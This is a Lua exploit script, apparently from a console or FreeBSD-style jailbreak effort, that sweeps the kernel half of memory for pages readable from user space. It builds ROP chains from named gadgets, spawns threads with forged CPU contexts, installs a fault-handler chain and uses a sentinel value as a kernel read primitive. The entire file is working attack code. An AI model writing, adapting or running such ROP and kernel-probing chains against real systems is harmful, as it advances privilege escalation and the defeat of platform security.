-- CRASH_CLASS: HIGH
-- PROBE 1056a: sweep the whole kernel half for user-readable pages
--
-- The fault oracle says which pages are present; it cannot say which are readable. So read
-- them: for each 2 MB step from 0xFFFFFFFF80000000 to 0xFFFFFFFFFFFFFFFF a child runs
--   pop rax; page; mov rax,[rax]; pop rdi; out[i]; mov [rdi],rax; exit(431)
-- If the load succeeds the slot holds the page's first qword; if it faults the handler dumps
-- the context, the store never happens and the slot keeps its sentinel. That single bit is a
-- read primitive: any slot that is not the sentinel is kernel memory we can read.
--
-- 1006a proved the load faults for a stub page and three image addresses; this asks whether
-- ANY page in the kernel half is mapped with the user bit set. 512 steps, ~60 ms each.
print("=== PROBE 1056a: kernel-half readability sweep ===")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function as_addr(t) local s=tostring(t) local m=s:match("0x(%x+)") if m then return tonumber(m,16) end return to_num(t) end
local function wq(a,v) pcall(function() memory.write_qword(uint64(a),uint64(v)) end) end
local function rq(a) local o,v=pcall(function() return memory.read_qword(uint64(a)) end) if o then return to_num(v) end return -1 end
local function hex(v) return string.format("%X", v) end
local function A(x) local ok,v=pcall(function() return as_addr(x) end) if ok and v and v>0 then return v end return 0 end

local sc_pid, sc_mmap, sc_thr, sc_ns = mk(20), mk(477), mk(430), mk(240)
print(string.format("[0] pid=%d", to_num(sc_pid(uint64(0)))))

-- the fault handler used by every child that dies
local ph = gadgets.stack_pivot[1]
local ctxt = memory.alloc(8)
local hc = ropchain({ stack_base = to_num(ph.pivot_addr) })
hc:push_store_rdx_into_memory(ctxt)
hc:push_syscall_raw(syscall.write, function()
    hc:push_set_rdx(0x40)
    hc:push_set_rax_from_memory(ctxt)
    hc:push_add_to_rax(0x100)
    hc:push_set_reg_from_rax("rsi")
    hc:push_set_reg_from_memory("rdi", signal.fd_addr)
end)
hc:push_syscall_raw(mk(431), function() hc:push_set_rdi(0) end)

local pop_rax = A(gadgets["pop rax; ret"])
local ld_rax  = A(gadgets["mov rax, [rax]; ret"])
local pop_rdi = A(gadgets["pop rdi; ret"])
local st_rdi  = A(gadgets["mov [rdi], rax; ret"])
local fn      = A(syscall.pipe.fn_addr)
if pop_rax==0 or ld_rax==0 or pop_rdi==0 or st_rdi==0 or fn==0 then
  print("[!] gadget/syscall address missing; aborting"); return
end

local function mmap(px)
    local ok, a = pcall(function() return sc_mmap(uint64(0),uint64(px),uint64(3),uint64(0x1002),uint64(0xFFFFFFFF),uint64(0)) end)
    local v = ok and to_num(a) or 0
    if v ~= 0 and v < 0x800000000000 then for o=0,px-8,8 do wq(v+o,0) end end
    return v
end
local stack = mmap(0x4000)
local outs  = mmap(0x4000)
local ctx   = memory.alloc(0x500)
local tb    = memory.alloc(8)
local ctxa  = as_addr(ctx)
if stack==0 or outs==0 or ctxa==0 then print("[!] mmap failed"); return end
print(string.format("[1] stack=%X outs=%X g=%X/%X/%X/%X fn=%X", stack, outs, pop_rax, ld_rax, pop_rdi, st_rdi, fn))

local Ctx={MAGIC=0x108,TYPE=0x110,CS=0x0C0,RIP=0x0E0,RSP=0x0F8,SS=0x100,RAX=0x078}
local BASE, STEP, N = 0xFFFFFFFF80000000, 0x200000, 512
local function probe(i, target)
    local ch = { target, ld_rax, pop_rdi, outs + i*8, st_rdi, pop_rax, 431, pop_rdi, 0, fn }
    -- 0x800 headroom: the kernel builds the signal frame below the faulting rsp
    for k = 1, #ch do wq(stack + 0x800 + (k-1)*8, ch[k]) end
    wq(outs + i*8, 0xDEADBEEF)
    for o = 0, 0x4F8, 8 do wq(ctxa + o, 0) end
    wq(ctxa + Ctx.MAGIC, 0x480); wq(ctxa + Ctx.TYPE, 0x10000)
    wq(ctxa + Ctx.CS, 0x43); wq(ctxa + Ctx.SS, 0x3B)
    wq(ctxa + Ctx.RIP, pop_rax); wq(ctxa + Ctx.RSP, stack + 0x800); wq(ctxa + Ctx.RAX, 20)
    wq(as_addr(tb), 0)
    local ok, rv = pcall(function() return sc_thr(uint64(ctxa), uint64(as_addr(tb)), uint64(0)) end)
    if not ok then return "spawn-error" end
    local ts = memory.alloc(16)
    wq(as_addr(ts), 0); wq(as_addr(ts)+8, 60*1000000)
    pcall(function() sc_ns(uint64(as_addr(ts)), uint64(0)) end)
    return rq(outs + i*8)
end

local readable, pages = 0, {}
for i = 0, N-1 do
    local target = BASE + i*STEP
    local v = probe(i, target)
    if v ~= 0xDEADBEEF then
        readable = readable + 1
        if readable <= 12 then pages[#pages+1] = string.format("%X=%s", target, type(v)=="number" and hex(v) or tostring(v)) end
    end
    if i % 64 == 63 then print(string.format("[%d] step=%s readable=%d", i, hex(target), readable)) end
end
print("[R] readable=" .. readable .. " of " .. N)
for _, s in ipairs(pages) do print("    " .. s) end
print(string.format("[E] alive pid=%d", to_num(sc_pid(uint64(0)))))
print("=== COMPLETE ===")
